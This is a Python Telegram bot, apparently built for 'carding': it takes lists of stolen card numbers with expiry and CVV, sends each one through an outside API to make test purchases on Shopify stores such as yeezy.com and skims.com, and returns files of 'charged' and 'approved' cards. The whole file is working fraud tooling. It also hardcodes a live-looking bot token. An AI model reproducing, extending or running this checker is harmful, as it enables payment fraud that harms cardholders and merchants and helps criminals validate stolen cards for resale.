import os
import re
import io
import time
import json
import queue
import threading
import requests
import telebot
from telebot import types

# ==================== CONFIG ====================
BOT_TOKEN = "8832919810:AAFDVQHyMbMEc9eLWJvlPeBqvT5eEv0LJ3Y"
ADMIN_ID = 6566026385
CREDIT = "@ZYELEO"

API_FILE = "apis.json"
SITE_FILE = "sites.json"

bot = telebot.TeleBot(BOT_TOKEN)

# ==================== STATE MANAGEMENT ====================
def load_json(file, default=[]):
    if os.path.exists(file):
        try:
            with open(file, 'r') as f: return json.load(f)
        except: pass
    return default

def save_json(file, data):
    with open(file, 'w') as f: json.dump(data, f, indent=4)

API_BASES = load_json(API_FILE, ["https://shopify-api-b6yt.onrender.com"])
SITES = load_json(SITE_FILE, ["yeezy.com", "skims.com"])

site_idx = 0
user_states = {} 

def get_next_site():
    global site_idx
    if not SITES: return "yeezy.com"
    site = SITES[site_idx % len(SITES)]
    site_idx += 1
    return site

def parse_combos(text):
    pattern = re.compile(r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*[|:,]\s*(\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})')
    combos = set()
    for line in text.splitlines():
        line = line.strip()
        if not line: continue
        m = pattern.search(line)
        if m: 
            combos.add((m.group(1).lower(), m.group(2)))
        else:
            card_match = re.search(r'(\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', line)
            if card_match: 
                combos.add(("RANDOM_SITE", card_match.group(1))) 
    return list(combos)

# ==================== MULTI-WORKER ENGINE ====================
def api_worker(api_url, combo_queue, msg, progress_lock, stats):
    """Each API gets its own worker thread. No proxies."""
    while True:
        try:
            site, combo = combo_queue.get_nowait()
        except queue.Empty:
            break
            
        url = f"{api_url}/shopii"
        payload = {"site": site, "cc": combo}
        
        try:
            r = requests.post(url, json=payload, timeout=45)
            if r.status_code == 200:
                result = r.json()
                res = result.get("Response", "").upper()
            else:
                res = f"HTTP_{r.status_code}"
        except Exception:
            res = "TIMEOUT"
            
        with progress_lock:
            stats['checked'] += 1
            if res in ("ORDER_PAID", "CHARGED"):
                stats['charged'] += 1
                stats['charged_lines'].append(f"{site} | {combo} | {res}\n")
            elif res in ("INSUFFICIENT_FUNDS", "APPROVED", "3DS_REQUIRED"):
                stats['hits'] += 1
                stats['hits_lines'].append(f"{site} | {combo} | {res}\n")
            else:
                stats['bad'] += 1
                
        combo_queue.task_done()

def process_bulk_thread(msg, combos):
    total = len(combos)
    combo_queue = queue.Queue()
    
    # Prepare combos
    for s, c in combos:
        if s == "RANDOM_SITE": combo_queue.put((get_next_site(), c))
        else: combo_queue.put((s, c))
        
    stats = {
        'checked': 0, 'charged': 0, 'hits': 0, 'bad': 0,
        'charged_lines': [], 'hits_lines': []
    }
    progress_lock = threading.Lock()
    start_time = time.time()
    
    # Start exactly one thread per API
    num_apis = len(API_BASES)
    threads = []
    for i in range(num_apis):
        api_url = API_BASES[i].rstrip("/")
        t = threading.Thread(target=api_worker, args=(api_url, combo_queue, msg, progress_lock, stats))
        t.daemon = True
        t.start()
        threads.append(t)
        
    # Progress monitor loop
    last_update = time.time()
    while any(t.is_alive() for t in threads):
        time.sleep(1)
        now = time.time()
        if now - last_update > 2.5:
            last_update = now
            with progress_lock:
                checked = stats['checked']
                pct = int((checked / total) * 100) if total > 0 else 0
                bar = "█" * int(pct / 10) + "░" * (10 - int(pct / 10))
                elapsed = int(now - start_time)
                
                text = (
                    f"🚀 **Shopify Checker**\n\n"
                    f"`[{bar}]` {pct}%\n"
                    f"📊 Checked: **{checked:,}** / {total:,}\n"
                    f"✅ Charged: **{stats['charged']:,}** | 🔥 Hits: **{stats['hits']:,}**\n"
                    f"❌ Bad: **{stats['bad']:,}**\n"
                    f"👷 Workers: {num_apis} APIs active\n"
                    f"⏱️ Time: {elapsed}s"
                )
                try: bot.edit_message_text(text, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
                except: pass
                
    # Final summary
    summary = (
        f"✅ **Done!**\n\n"
        f"Total: `{total:,}`\n"
        f"Charged: `{stats['charged']:,}`\n"
        f"Hits: `{stats['hits']:,}`\n"
        f"Bad: `{stats['bad']:,}`\n\n"
        f"💠 {CREDIT}"
    )
    bot.edit_message_text(summary, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')

    if stats['charged'] > 0:
        bot.send_document(msg.chat.id, (f"charged_{int(time.time())}.txt", "".join(stats['charged_lines']).encode()), caption=f"✅ **{stats['charged']:,} Charged**\n💠 {CREDIT}", parse_mode='Markdown')
    if stats['hits'] > 0:
        bot.send_document(msg.chat.id, (f"hits_{int(time.time())}.txt", "".join(stats['hits_lines']).encode()), caption=f"🔥 **{stats['hits']:,} Hits**\n💠 {CREDIT}", parse_mode='Markdown')


# ==================== UI KEYBOARDS ====================
def main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("⚙️ APIs", callback_data="menu_api"),
        types.InlineKeyboardButton("🏪 Sites", callback_data="menu_site"),
        types.InlineKeyboardButton("📊 Stats", callback_data="menu_stats")
    )
    markup.add(types.InlineKeyboardButton("🛠 How to Use", callback_data="menu_help"))
    return markup

def site_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("➕ Add Site", callback_data="site_add"),
        types.InlineKeyboardButton("📜 List Sites", callback_data="site_list"),
        types.InlineKeyboardButton("🧹 Clear All", callback_data="site_clear"),
        types.InlineKeyboardButton("🔙 Back", callback_data="menu_main")
    )
    return markup

def api_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("➕ Add API", callback_data="api_add"),
        types.InlineKeyboardButton("📜 List APIs", callback_data="api_list")
    )
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_main"))
    return markup

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start', 'help'])
def start(message):
    text = (
        "🛍️ **Shopify Checker Bot**\n\n"
        "**Commands:**\n"
        "• `/chk cc|mm|yy|cvv` → Auto-pick a random saved site\n"
        "• `/chk site.com | cc|mm|yy|cvv` → Target a specific site\n"
        "• Reply to `.txt` with `/chk` → Bulk check\n\n"
        "⚙️ *Manage APIs and Sites below.*"
    )
    bot.reply_to(message, text, reply_markup=main_menu(), parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    global SITES, API_BASES
    
    data = call.data
    if call.from_user.id != ADMIN_ID and "menu" not in data:
        bot.answer_callback_query(call.id, "❌ Admin Only!")
        return

    if data == "menu_main":
        bot.edit_message_text("⚙️ **Main Dashboard**\nSelect an option below:", call.message.chat.id, call.message.message_id, reply_markup=main_menu(), parse_mode='Markdown')
    elif data == "menu_site":
        bot.edit_message_text(f"🏪 **Site Manager**\nSaved Sites: `{len(SITES)}`", call.message.chat.id, call.message.message_id, reply_markup=site_menu(), parse_mode='Markdown')
    elif data == "site_add":
        user_states[call.from_user.id] = "awaiting_site"
        bot.edit_message_text("➕ **Send site URL**", call.message.chat.id, call.message.message_id, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("❌ Cancel", callback_data="menu_site")))
    elif data == "site_list":
        text = "📜 **Saved Sites:**\n\n" + "\n".join([f"{i+1}. `{s}`" for i, s in enumerate(SITES)]) if SITES else "❌ No sites saved."
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=site_menu(), parse_mode='Markdown')
    elif data == "site_clear":
        SITES = []
        save_json(SITE_FILE, SITES)
        bot.answer_callback_query(call.id, "✅ Sites Cleared!")
        bot.edit_message_text(f"🏪 **Site Manager**\nSaved Sites: `0`", call.message.chat.id, call.message.message_id, reply_markup=site_menu(), parse_mode='Markdown')
    
    elif data == "menu_api":
        bot.edit_message_text(f"⚙️ **API Manager**\nActive APIs: `{len(API_BASES)}`", call.message.chat.id, call.message.message_id, reply_markup=api_menu(), parse_mode='Markdown')
    elif data == "api_add":
        user_states[call.from_user.id] = "awaiting_api"
        bot.edit_message_text("➕ **Send API URL**", call.message.chat.id, call.message.message_id, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("❌ Cancel", callback_data="menu_api")))
    elif data == "api_list":
        text = "📜 **Saved APIs:**\n\n" + "\n".join([f"{i+1}. `{a}`" for i, a in enumerate(API_BASES)]) if API_BASES else "❌ No APIs saved."
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=api_menu(), parse_mode='Markdown')
    
    elif data == "menu_stats":
        bot.edit_message_text(f"📊 **Stats**\n\n⚙️ APIs: `{len(API_BASES)}`\n🏪 Sites: `{len(SITES)}`\n👷 Workers: `{len(API_BASES)}`", call.message.chat.id, call.message.message_id, reply_markup=main_menu(), parse_mode='Markdown')

# ==================== MESSAGE HANDLERS ====================
@bot.message_handler(content_types=['document'])
def handle_document(message):
    uid = message.from_user.id
    if user_states.get(uid) in ("awaiting_site_file", "awaiting_site"):
        user_states[uid] = None
        msg = bot.reply_to(message, "⏳ Parsing sites...")
        try:
            file_info = bot.get_file(message.document.file_id)
            content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
            lines = [line.strip().lower() for line in content.splitlines() if line.strip()]
            added = 0
            for s in lines:
                if s not in SITES:
                    SITES.append(s)
                    added += 1
            save_json(SITE_FILE, SITES)
            bot.edit_message_text(f"✅ Added `{added}` sites.\nTotal: `{len(SITES)}`", msg.chat.id, msg.message_id, reply_markup=site_menu(), parse_mode='Markdown')
        except Exception as e:
            bot.edit_message_text(f"❌ Error: {e}", msg.chat.id, msg.message_id)
        return

@bot.message_handler(func=lambda msg: user_states.get(msg.from_user.id) == "awaiting_site")
def handle_site_input(message):
    user_states[message.from_user.id] = None
    url = message.text.strip().lower()
    if url not in SITES:
        SITES.append(url)
        save_json(SITE_FILE, SITES)
        bot.reply_to(message, f"✅ Added `{url}`.", reply_markup=site_menu(), parse_mode='Markdown')

@bot.message_handler(func=lambda msg: user_states.get(msg.from_user.id) == "awaiting_api")
def handle_api_input(message):
    user_states[message.from_user.id] = None
    url = message.text.strip()
    if not url.startswith("http"): url = "https://" + url
    if url not in API_BASES:
        API_BASES.append(url)
        save_json(API_FILE, API_BASES)
        bot.reply_to(message, f"✅ API Added!", reply_markup=api_menu(), parse_mode='Markdown')

# ==================== CHECK COMMANDS ====================
@bot.message_handler(commands=['chk'])
def handle_chk(message):
    if not API_BASES:
        bot.reply_to(message, "❌ No APIs configured.")
        return

    # BULK CHECK
    if message.reply_to_message and message.reply_to_message.document:
        doc = message.reply_to_message.document
        if doc.file_size > 20 * 1024 * 1024:
            bot.reply_to(message, "❌ File too large (Max 20MB).")
            return
            
        msg = bot.reply_to(message, "⏳ Downloading...", parse_mode='Markdown')
        try:
            file_info = bot.get_file(doc.file_id)
            content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
            combos = parse_combos(content)
            
            if not combos:
                bot.edit_message_text("❌ No valid combos found.", chat_id=msg.chat.id, message_id=msg.message_id)
                return
                
            bot.edit_message_text(f"🚀 Checking **{len(combos):,}** combos using **{len(API_BASES)}** API workers (No Proxy)...", chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')
            
            t = threading.Thread(target=process_bulk_thread, args=(msg, combos))
            t.start()
            
        except Exception as e:
            bot.edit_message_text(f"❌ Error: {e}", chat_id=msg.chat.id, message_id=msg.message_id)
        return

    # SINGLE CHECK
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2: return
    combos = parse_combos(parts[1])
    if not combos: return
        
    site, combo = combos[0]
    if site == "RANDOM_SITE": site = get_next_site()
        
    msg = bot.reply_to(message, f"🔍 Checking `{site}`...", parse_mode='Markdown')
    
    # Single check grabs one API
    api = API_BASES[0].rstrip("/")
    url = f"{api}/shopii"
    try:
        r = requests.post(url, json={"site": site, "cc": combo}, timeout=45)
        result = r.json() if r.status_code == 200 else {"Response": f"HTTP_{r.status_code}"}
    except:
        result = {"Response": "TIMEOUT"}
        
    res = result.get("Response", "ERROR").upper()
    price = result.get("Price", "0.00")
    
    emoji = "✅" if res in ("ORDER_PAID", "CHARGED") else ("🔥" if res in ("INSUFFICIENT_FUNDS", "APPROVED") else "❌")
    text = f"{emoji} **Status:** `{res}`\n🌐 Site: `{site}`\n💳 Card: `{combo}`\n💰 Price: `{price}`\n\n💠 {CREDIT}"
    bot.edit_message_text(text, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode='Markdown')

if __name__ == "__main__":
    print("Starting Bot...")
    bot.infinity_polling()
